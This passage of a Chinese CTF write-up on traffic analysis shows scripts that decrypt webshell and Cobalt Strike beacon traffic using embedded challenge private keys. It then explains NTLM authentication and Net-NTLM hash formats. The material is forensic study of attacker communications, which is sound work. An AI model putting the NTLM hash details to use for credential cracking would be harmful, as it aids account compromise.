'BLHRbtBoY+9jjKwUn3g/6VjqpEGtzEorD2bcNsSnGNTh365TacqwN6vG0ONzTjdHkdd8YhhtPvFsLDAj9Tkn3XRHzCEVFf6oao2xivHpDC0w5e1RniXFpl5DlA2R+XfyxxN0oDHgdtemCCwotSX9/D6TX28nFvmpVPxoX7IBtV5NVSt9nTbnDQp/UEEPKmpH3g8bt4UETFoJ086J9yNOS5J9uHSdmWBa3vQVor0gUay9tb4Gi9YpztDcLD9mA/C8aThpNED3ybAEHF1JK8+So/L3Kw9K+M7uW+9fkFIkUhWxFk9+a+W6fIPR2YDn4IcUmuh6Pw7M2NKzkM+QIyZ/fg==', 'nD0ETT7Mzl7+XF5kZhI0pIuONkncH5dNPVGzS5jaAS2Pcpva/SdCkCaRkg4C9s2uZrBEkWWFWM/7gx/tlmJYHM/6cwIlbk9PLJAVcUrw6Ecgx6hiEbP4dWcKg2VSzwacsyozCGeMeZV3LQCGRTfi6ewm/QpW+mujiQH38sj4/N5NVSt9nTbnDQp/UEEPKmpH3g8bt4UETFoJ086J9yNOS5J9uHSdmWBa3vQVor0gUay9tb4Gi9YpztDcLD9mA/C8aThpNED3ybAEHF1JK8+So/L3Kw9K+M7uW+9fkFIkUhWxFk9+a+W6fIPR2YDn4IcUmuh6Pw7M2NKzkM+QIyZ/fg==', 'PDMzPKDsBdh0LHO+RJn7G+bShEVxn5hwPb5RfzwLjZIhvHQdWat+S34q+e8G9yfJWrTYg8StP9AjDGyLK/TcWtI6eY+VRGUvUJ4fGMoT09sS6zILqDInOzHrhEHin4IgkowJoF3TFX2KukR38LZgKn5VKi9F7Ue0l2hqeO0IRq8c69F5II1xspprr2YGy3hU9nO38KTUD/4kPbuu8rsit4/BSdJdWv4+xIjEcS11SzTMWemzVGMv/Ax/NiZGtJFCaW3XB0w0M1XWXG8ewGmpj/8u+VzPoDXhWCrYRvsw5mZdQ5FFmHHCU5mtMsI3mGNjnmUnD5IXbV6TfcQmlPrs0w==', 'lTtqYzsk9q59ReMvJUcP5fKUYoxfZQS9QmOyjqbBvy/9wAX16xpnqmhUlwHIDNAlz9nIZPCJHjV66Ey/S7px2UW+921Lm1a2YocFcTkDS7zqNqDaoS0cpigSTB4skhRR7pAe43n3CCbvRlF6sI/uOZxUnfg2nXHkhAyDGJsCxgQ='];

//$_POST["y21db7ea65d36d"] = ['ZqGizxiHeHVBCCyvo46huPPtI7TBLmoEQP/GX9AGPW1ewqeV+9/LeJVWT1o0ALkFCVj1DDfutzXfrIQdpVh+HBoVUiGjjG8sSRiEPfRJmzAzVxR+9nnwrF4EObavmAA3Hh/0TBtirl+9iUEU8bN5TrnV6Gq5y2RbYeE3Mri2K/0=', 'b46b/qgtImXh6TF3gxU2HZHjmKbjhV5WXV5d1wqTANk6v7RKgR/Tq/IzYnIGwduVwwX2mf/kXl2OwqEwmhaqc2xoUK0EytOYe8y+tw+oE8C1AGMVEPVEH/LM77s4iU81SQqr5nPHQjSprv8UQR0tIUfB42JgSuw82SxoR8T3Nc0=', 'g8K2XGqaUSdc2og56FbCAgHsAdlcxQajw7hJ5cUOe2ix93yk8MhwnWvAkHcXy/PQG9Da9ScixBzJFw/dnINflq4yLkp8N/07JSZgg7DPLz/o1se4+yMv6H+IP2cD0Q1UU2n4PAEbCtAA60m0kczWz/fE81DbVj6JxgWl+EmElOI=', 'Wjero64jDdIPWXLGz1rrNCfjcjJhJlH2NmUIT8WK7thISuS/Bm7RnnFyIC4jnkhuX4ZTtsY3IWuAO41R2JfBcZi5fZlPDLdDn5ojOmm5CRcHacCFy7KTmDtYtSsjD5vzBaKrMfF2tRN8bnd8CT91V6rg40ff2+9HvHjH7BBhXUI=', 'aG30z0UroESpnX1CNbp2HS4DrVWrtqOWs1Jpw5ONcWdr64bkB05DdNHpW5Nqh9xVvlJTuVXWyrPc4V12GwmuN4ifN8TtHCq1n4/TnY/BerzzYaXrp89iXXkXmwRUFEqJ+iOVNjAzfdTdnRPaMPtRUFQjugF0U+3AYa9SrnsLrLk=', 'QCXq2VxN88Rey14xm35TsRqAj1cbIgKma0PxY2qrJ6DRD8D6JhT0CbF37pQDUyFU1iuBhR/h4tVd/k8PCBRoKOPF2R/1jDol3EQAWLSYZUd8mOCY72XD2wnnltTTHqB26N5nbm6qaGx5fi0PWH++Ds0mrCiJsE2+fMFIXDGCXag=', 'kqNJjIRlbVMlD8E5yPJmYBzTNKxSVpKARQOeA2K9SCUeMZEARoaru3aL91Qefzo/fhWCWEwieXyeBZdjE8c1dY73u7D/jneXW68krQXndzrNwFTDQRyiOvZJRREQ7ZNOyDmB7ltpLv+mizWTv/bQezF7sbIh4KswbjXuCj8w0NE=', 'BvzvMn7WAaWgqdlyMbUzEzgRDr3PFNgwIClZ3C7JTMMTqhErpNgvrLxHVoNelTJsj9y1VatUKGRir9qs67L++SYMICBLTiu3ZctGtdmsxufbTMYfWr8EbiiDd0bYhPvYbzlHU1MlI+fpEUUrGckC5caeVcHaqNB7tdhDJvFms4E=', 'ecC2GvhvXqIFNVLx8g1YPX+VeUOiFKLDHik8NnmrCbPQFtduUwvhiMT2joMHhr5f5fOVi/jpwrlC2yR2jhPDtmIl8nkJqnTd+uBykNguN5moHixbKWMMv8HYejnT7CLGmTxLDzTrQlICua+4O31jOOmDrrLuUdLKI2uaQ1FUAMc=', 'Hg8A03izTr7zhommneQYE2d9UO+EpWtU3Q9rYM3YnJf7SkVcw9+NHKno7COU1NVbXiHJjV2bTDcVnAkQeJJqZGXNJfR3kSo3XYlwXZGWatrccd/ADyu7E+Bt4oXtp4pDpafhDJLh40cd6jprQnIYxDYBcs4o6CJjvR7JpOLmC0A=', 'YsLUw+DPF6JpxvD0B8blORoPd3xe6y4P0gYWlHgRwnlCRjyS3LlKRbY2lqrtulh/MRz0yGOSYjifa0c4sbqsbIf+ENFXmiqqm3ySPjXWl4z2wdrZMEV4ZXp6VXTxNk6cizDoONBDXXuTziZDB+DAev3+6HHtaI5tspkMVap2ou4=', 'GyS1qCDux10wqJhGI7tKn4MTwRiRhAMoN3/DpO2ehtOkp/G0tS1Dhi8tdpWU6OqqtxPs/6G/GqEoC1PU2StQzal0QO06pAXixlMvx1lkHmAOAj7GI5vWnETeyrTUBkGwdRki3+VlvU1eUOVhJLg046EMaJsy5z4Zz7Xn++d1BsM=', 'KY2kr0R6yNTgxw40gZEZKGfZslgQEEEOqRADN2skaB+hdfniw7t/eV7YrDbJfkzaPo+oUGbebR4IRPcWgeIYJjtte9h/y/ugcFu2SmZ6PEIp35gin1LKqWehNA9gnXeRVP/zpAD7kmVK5PMfWU32V7lvp6Dn00KdpH5CPHWcQO8=', 'IRX0gA23Zu3I8rlcswv+iqJIfs3Kf5jKmiq3FrB0Zcs2N7VfZE7y3qy7/T2OAC98KrO874t0tOLDxhBw6hDz6zKRINRjZLy4cQC1MhUWJG0lqX2cI25ePHfmPUpFnRUzZBBkuP7TqFO+PzJiLA8V9cxe7uWpt2dw/cC11r+k29Y=', 'MmCqLxv78f+GCRBM16oPUgQCiSn6yB9O0UuVILu/e0ISAWsXvInQT+VqU3dORntNyV5+VSbrn7u0in1c4PJHz5oH0wVcdwVbeH+K6CLOVF43Pi1HkWiKREECpLKO8ClDkDLeAbZ5SVgSjVuUqVT5f4TOKKSB/EZVnWlIE1PJrH4=', 'gyfTIHW5Ov921U8HQ/3qENdIwwMoBm8JJ0KI1XoLBNDDEYLKX8+EGNlNZikwBCOPNiP8FYftgUTQzS5DokJzDm4TG89k49i1In8Oeekdb1phbZkUWpboWv9+VPTEc5VH+wCM/l8FA0wvZsm/iqfwe6grn3C6PUNP+AOo0QcywKw='];


//$length = count($_POST[array_key_first($_POST)]);  // 获取任意一个子数组的长度
//echo $length; // 16
//
//for ($i = 0; $i < $length; $i++) {
//    $res = "";
//    openssl_public_decrypt(base64_decode($_POST["l6eca85c56d82c"][$i]), $de, $pk);
//    $res .= base64_decode(substr($de, 2)) . " ";
//    openssl_public_decrypt(base64_decode($_POST["u51aea36fa19a7"][$i]), $de, $pk);
//    $res .= base64_decode(substr($de, 2)) . " ";
//    openssl_public_decrypt(base64_decode($_POST["y21db7ea65d36d"][$i]), $de, $pk);
//    $res .= base64_decode(substr($de, 2));
//    echo $res . "\n";
//}
```

### CobalStrike流量分析

> 参考链接：https://5ime.cn/cobaltstrike-decrypt.html

#### 密钥对文件的情况

先从流量包中导出key文件

然后在 cs-scripts中运行 python3 parse_beacon_keys.py 得到私钥

```
-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1r
To4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5Gqh
Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAEC
gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V
r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFW
vHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL
3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNp
v+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG
9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C
dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB
AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2
ddsyNI6XbCU=
-----END PRIVATE KEY-----
```

在数据包的HTTP请求中获得Cookie，然后修改CS_Decrypt中的 Beacon_metadata_RSA_Decrypt.py 的私钥和Cookie

运行即可得到 AES和HMAC key

```
AES key:ef08974c0b06bd5127e04ceffe12597b
HMAC key:bd87fa356596a38ac3e3bb0b6c3496e9
```

然后把这两个key填入 Beacon_Task_return_AES_Decrypt.py 中

把流量包中的POST数据包中的data的值用CyberChef (from hex+to base64) 处理后得到的数据填入上面那个脚本中

一个个解密每个POST数据包中的data即可得到flag

我把上面的步骤整合成了下面一个脚本

```python
import base64
import javaobj.v2 as javaobj
import hashlib
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
import hexdump
import hmac
import binascii
from Crypto.Cipher import AES


def format_key(key_data, key_type):
    key_data = bytes(map(lambda x: x & 0xFF, key_data))
    formatted_key = f"-----BEGIN {key_type} KEY-----\n"
    formatted_key += base64.encodebytes(key_data).decode()
    formatted_key += f"-----END {key_type} KEY-----"
    return formatted_key

def extract_key(keyfile):
    with open(keyfile, "rb") as fd:
        pobj = javaobj.load(fd)

    privateKey = format_key(pobj.array.value.privateKey.encoded.data, "PRIVATE")
    publicKey = format_key(pobj.array.value.publicKey.encoded.data, "PUBLIC")
    return privateKey,publicKey
    
def get_AES_HMAC_key(PRIVATE_KEY,encode_data):
    '''
    提取协商密钥
    '''
    private_key = RSA.import_key(PRIVATE_KEY.encode())
    cipher = PKCS1_v1_5.new(private_key)
    ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)

    if ciphertext[0:4] == b'\x00\x00\xBE\xEF':
        raw_aes_keys = ciphertext[8:24]
        raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()
        aes_key = raw_aes_hash256[0:16]
        hmac_key = raw_aes_hash256[16:]

        print("AES key: {}".format(aes_key.hex()))
        print("HMAC key: {}".format(hmac_key.hex()))
        hexdump.hexdump(ciphertext)
        
        return aes_key.hex(),hmac_key.hex()
    
def decrypt_submit_data(SHARED_KEY,HMAC_KEY,encrypt_data):
    '''
    使用协商密钥解密CS的数据
    '''
    SHARED_KEY = binascii.unhexlify(SHARED_KEY)
    HMAC_KEY = binascii.unhexlify(HMAC_KEY)
    def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
        if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:
            print("message authentication failed")
            return

        cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
        return cipher.decrypt(encrypted_data)

    encrypt_data = base64.b64decode(encrypt_data)
    encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False)
    encrypt_data_l = encrypt_data[4:]

    data1 = encrypt_data_l[:encrypt_data_length-16]
    signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]
    iv_bytes = b"abcdefghijklmnop"

    dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
    print("="*80)
    print("counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False)))
    print("任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False)))
    print("任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
    print(dec[12:int.from_bytes(dec[4:8], byteorder='big', signed=False)])
    print(hexdump.hexdump(dec))


if __name__ == "__main__":
    keyfile = "key" # 题目一般会提供，该文件本质上为 KeyPair 的 Java 对象
    privateKey,publicKey = extract_key(keyfile)
    # print(privateKey)
    # 协商密钥和主机信息被使用 rsa 公钥加密之后放在了心跳包的 cookie 中
    cookie_data = "U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s="
    SHARED_KEY,HMAC_KEY = get_AES_HMAC_key(privateKey,cookie_data)
    submit_data = ["000000e046950d669f91c7c7d9a7580c78f13a9f568122f2a8aba597a52f3832b0afbde054602fe158dbe173ff2532036facafdada898e3c9d798ea5e803269221fef2436fc22428e4d4aac53979ce80dd4809a2d3391dfdb1ea043e9761250175b0ceb38157319e366af76a88464f7d8672e614a051ca4fa846d6e22ee654ce0271381867f13c44ee15a26fc03316596f64bb0786e16af8a8fd900f7d0c7fa895c408e3915fa6a9a5085df6854c34dbf55d968d7f69b00b12083750c30564f94547f6eb6ee62beacda5a73d72ea7d81c79919802aecafed6d991bd0b1b18e04fca5c480","00000040e992086d1e786eeb9b4329bf6eee6f593e44609505d7d0118af590b5e40840782232f30b12ed76f54ef4898d69470498cb4afe43841790fe12af184011858984","000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698","000000e0453bf91036fff19e04ce60d065f37f4ed23345246fa7b5ce91d64de96781604717aa720a0f411cf5545d66c750ff0ee7aaa7f4be7e7070ba1ff180f6373d670c7b0e8c73617ec9e3f388a4f99a3d00aca4e85e80db6a8e1a661da37b184b2d779d2d5f6e594ca4c81b3c2fe16856b24d2d6551fed5f79540fcc4ca1ce66168d32f656ea5b7f66d26ae99812a6612da54670acc82524160fc765c1c8cc89cdf110fe4a40a195aa693bd98965abc3244f5c4bd89c104dafcd5e87542dfd90751cf8ea82a769070b01d9af4b037e1ba618de23a378d83104375cc9745893ddc5482"]
    for item in submit_data:
        encrypt_data = base64.b64encode(bytes.fromhex(item))
        decrypt_submit_data(SHARED_KEY,HMAC_KEY,encrypt_data)
    
```

#### 给Beacon的情况

1、使用 [1768.py](https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py) 去解析 Beacon 文件

2、解析公钥，爆破n生成私钥

3、使用私钥去解密心跳包中的cookie信息得到`AES_KEY`和`HMAC_KEY`

```python
import base64
import hashlib
import hexdump
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5


privateKey = '''-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO
FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1
qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg
p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
-----END RSA PRIVATE KEY-----'''

publicKey = '''-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75N
d+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAE=
-----END PUBLIC KEY-----'''
    
def get_AES_HMAC_key(PRIVATE_KEY,encode_data):
    # 提取协商密钥和主机信息
    private_key = RSA.import_key(PRIVATE_KEY.encode())
    cipher = PKCS1_v1_5.new(private_key)
    ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)
    if ciphertext[0:4] == b'\x00\x00\xBE\xEF':
        raw_aes_keys = ciphertext[8:24]
        raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()
        aes_key = raw_aes_hash256[0:16]
        hmac_key = raw_aes_hash256[16:]
        hexdump.hexdump(ciphertext) # 主机信息
        return aes_key.hex(),hmac_key.hex()
    

if __name__ == "__main__":
    # 协商密钥和主机信息用RSA公钥加密之后放在了心跳包的cookie中
    cookie_data = "SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k="
    SHARED_KEY,HMAC_KEY = get_AES_HMAC_key(privateKey,cookie_data)
    print(f"AES key: {SHARED_KEY}")
    print(f"HMAC key: {HMAC_KEY}")

# 00000000: 00 00 BE EF 00 00 00 5D  28 AB 95 1F C9 6B CB 93  .......](....k..
# 00000010: EC 13 CF 9D D5 F2 13 73  A8 03 A8 03 43 50 DF EC  .......s....CP..
# 00000020: 00 00 0B 50 00 00 0E 06  01 1D B0 00 00 00 00 77  ...P...........w
# 00000030: 02 04 D0 77 02 34 70 8C  B8 A8 C0 57 49 4E 2D 52  ...w.4p....WIN-R
# 00000040: 52 49 39 54 39 53 4E 38  35 44 09 41 64 6D 69 6E  RI9T9SN85D.Admin
# 00000050: 69 73 74 72 61 74 6F 72  09 61 72 74 69 66 61 63  istrator.artifac
# 00000060: 74 2E 65 78 65                                    t.exe
# AES key: 9fe14473479a283821241e2af78017e8
# HMAC key: 1e3d54f1b9f0e106773a59b7c379a89d
```

4、解密心跳包 /cm 中传输的数据

```python
import hmac
import binascii
import base64
import hexdump
from Crypto.Cipher import AES

def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
    if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:
        print("message authentication failed")
        return
    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
    return cipher.decrypt(encrypted_data)

if __name__ == "__main__":
    SHARED_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8")
    HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d")
    with open('data.txt','r') as f:
        data = f.read()
    encrypt_data = bytes.fromhex(data)
    encrypt_data_length = len(encrypt_data)
    print(f"[+] 数据总长度为：{encrypt_data_length}")
    # encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False)
    data = encrypt_data[:encrypt_data_length-16]
    signature = encrypt_data[encrypt_data_length-16:]
    iv_bytes = b"abcdefghijklmnop"

    dec = decrypt(data, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
    print(f"{'='*80}")
    print("[+] counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False)))
    print("[+] 任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False)))
    print("[+] 任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
    pcapng_data = dec[64:-60]
    with open("out.pcapng",'wb') as f:
        f.write(pcapng_data)
    print(hexdump.hexdump(pcapng_data))
    # output = dec[12:int.from_bytes(dec[4:8], byteorder='big', signed=False)].decode('gbk',errors='ignore')
    # print(output)
```

5、解密submit.php中回传的数据

```python
import hmac
import binascii
import base64
import hexdump
from Crypto.Cipher import AES

def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
    if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:
        print("message authentication failed")
        return
    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
    return cipher.decrypt(encrypted_data)

if __name__ == "__main__":
    SHARED_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8")
    HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d")
    encrypt_datas = ["00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3","000001602a99f7cc51face35199e8b1a4a5616e0301591b6f1f48b1d000149cb83d6a81e9659849a52c4f50a8629b0dfb7c036df406b44d449e40fe18df3594721e1f5849662271c1ea18b18c8eb58af5ee2c3a784852dd1c4a5c699f9518d2e2fc70d756cd68361ac794eed4eae6b062be6c31651caf93954f2a89b10e25b1fd9757ec17ee8b97038c4babb73c4f21688f5d235797844c2c9c288fac3fd2bd9cf5373956389b7e5232e35b6f268f9d67ba54f3e7e1606d4cb4020d5f480c6e5f4409b8d87e0443ae0bcfe93d286291ba6bfd0c7f37593581d90bb4ab7cfb065b4421a727f120fb491c2dc01797e38996dfc123fb120c5ed312577cc917d8a435b73c25b6d29ef0bad595100256c9aa5571e5c0ce0a8ea2c173ca1fae577fa924506b75b86522052f019d6843d74dc6fbdf2219b77e020a049c4e77df3658c80bcb703f8f878ff2f70c5c69d0cf6f4efb5a755ba854dfa5777a23989286770da6e0444d0","000000d0c72ef8b74a7d8acc332695b62448280f9a4eaa12457de4adcad279b0563f2d4cb0707f7e2853c45acf28a365d905cf8ca421d557bd7655cbd50aafbdbe5f3f570c9c3d876d0c21b661ca5c46e09f987f7e1263f6d33c34db28a2fd342fe48e5801d1a97fb88e00f0c648ec889f6b72d71edd2eed5affd32bc8d51e27fcc148d16823c1bc235b0e16d9d477bd0b4582941db373e171cce78b10c869eb987baf3fd9f879b236be6f3af43b7742f6241dfe02ab696c96f1779d0003d6b2720d1c93890e75fcce939f1c8e0922ce5044bc3a","00000100f24f15cd6f33c36e70ca228d10babfac1cf6bfbb9b6923a7828c9ed30b76d3ce1cb3d8f97c358bf90004e771ac646b1b996fd248ac8f0b460e0a36950dffcde04f3bae831982b528393f3a3c771310ba0c0bb7418ba5e8734a6bd37bc8a51cc0683c0904e0f404180e4c4c34720a3e5d6767c435f1746e6b93a13a2ecdc8074089e684b90748fc1a7e24e66bd637673437d9e24a37ce6f584b478e2f0485f3c05414dd4c35eb9ecfed8d4fbdab54db4233258f4fea6ed515a1030feeb184db94a4841236b491d2f7379e10f52d50ae573cd6f4504aa9750da273fa65c2a9eaf9b9bb014cafc53a9e9f0042bfcd5d24fc1b29173fd3308ff08d30b2a7d42132d4"]
    for encrypt_data in encrypt_datas:
        # encrypt_data = base64.b64decode(encrypt_data)
        encrypt_data = bytes.fromhex(encrypt_data)
        encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False)
        encrypt_data_l = encrypt_data[4:]
        data1 = encrypt_data_l[:encrypt_data_length-16]
        signature = encrypt_data_l[encrypt_data_length-16:]
        iv_bytes = b"abcdefghijklmnop"

        dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
        print(f"{'='*80}")
        print("[+] counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False)))
        print("[+] 任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False)))
        print("[+] 任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
        output = dec[12:int.from_bytes(dec[4:8], byteorder='big', signed=False)].decode('gbk',errors='ignore')
        print(hexdump.hexdump(dec))
        print(output)
```

例题1-2024西湖论剑初赛-cscs

## NTLM认证流量分析

### NTLM认证的基本概念

#### NTLM 协议概述：

> NTLM是一种专用于Windows网络的 挑战/响应 认证协议。它本身并非独立协议，其消息必须嵌入在上层协议（如SMB、LDAP、HTTP）中进行传输。这一点与更为灵活的Kerberos协议不同，后者既可嵌入也可作为独立的应用层协议运行。

NTLM 认证由以下三种消息构成：

> Type1 协商：主要用于确认双方协议版本
> 
> Type2 质询：就是 挑战/响应 认证机制起作用的范畴
> 
> Type3 验证 在质询完成后验证结果

#### NTLM 认证的完整流程：

- 第一步 - 协商：认证始于客户端向服务器发送Type 1协商消息，告知服务器它所支持的NTLM协议版本和一系列功能列表。

- 第二步 - 质询：服务器在收到请求后，会回复一个Type 2质询消息。此消息不仅确认了双方认可的功能列表，其最核心的作用是向客户端发送一个由服务器生成的、一次性的16位随机数，即Challenge（质询）。

- 第三步 - 响应：客户端收到Challenge后，利用本机存储的对应用户密码的NTLM Hash对其进行加密，生成一个唯一的Response（响应）。随后，客户端将Response、用户名以及Challenge一同封装在Type 3消息中发回服务器。

- 第四步 - 验证：服务器在拿到Type 3消息后，需要验证Response的有效性。如果用户是本地账户，服务器会用自己的数据完成校验；但如果用户属于域账户，服务器自身没有用户密码的Hash，此时它会通过Netlogon协议与域控制器建立安全通道，将完整的Type 1、Type 2、Type 3消息转发给域控。

- （第五步 - 域控裁决）：域控制器作为最终的认证机构，它使用自身数据库中的用户Hash和收到的Challenge，以相同的算法重新计算Response。通过比对计算结果与客户端发来的Response是否一致，域控能够做出最终裁决，并将认证成功与否的结果返回给服务器，从而完成整个认证流程。

#### Net-NTLM Hash 与响应类型

在NTLM认证的Type 3消息中，客户端可能发送六种不同类型的响应，其演变历程体现了微软在安全性上的不断改进：

- LM响应：最古老的响应类型，由早期客户端使用，安全性极低。

- NTLM v1响应：由Windows NT、2000、XP等客户端发送，取代了LM响应。

- NTLM v2响应：从Windows NT SP4引入的更安全响应，在现代系统中取代NTLM v1响应。

- LM v2响应：NTLMv2协议中用于替代LM响应的版本。

- NTLM2会话响应：一种折中方案，在不使用完整NTLMv2认证时，也能增强会话安全性。

- 匿名响应：用于建立匿名上下文，不进行真正的身份验证。

所有这些响应类型都基于Challenge/Response机制，其根本区别在于使用的加密算法和对Challenge的处理方式不同。

#### Net-NTLM Hash 的格式

> NTLM v1 和 NTLMv2 响应分别对应 Net-NTLM Hash v1 和 Net-NTLM Hash v2

 - Net-NTLM Hash v1：`username::hostname:LM response:NTLM response:challenge`

	状态：已废弃，因存在严重安全缺陷，只要获取到 Net-NTLMv1，即可轻易破解出原始 NTLM Hash，与密码强度无关。

- Net-NTLM Hash v2：`username::domain:challenge:HMAC-MD5:blob`

	状态：当前推荐使用的、更安全的版本。

#### Net-NTLM Hash 的生成流程

1. Net-NTLMv1 的生成（两种方法）

	- 共同前置步骤：
	
			获取用户密码的 NT Hash。
			在 NT Hash 后补 5 个字节的 0，使其变为 21 字节。
			将这 21 字节分成 3 组（每组 7 字节），并将每组 7 比特数据后添加 1 比特 0，构成 3 个 8 字节的 DES 密钥。
	
	- 方法一（未协商会话安全）：
	
			使用上面得到的 3 个 DES 密钥，直接对 8 字节的 Server Challenge 进行加密，生成 3 段 8 字节密文，组合成 24 字节的响应。
	
	- 方法二（已协商 NTLMv2 会话安全）：
	
			拼接 8 字节的 Server Challenge 和 8 字节的 Client Challenge。
			计算这个 16 字节数据的 MD5 散列值，并取前 8 字节。
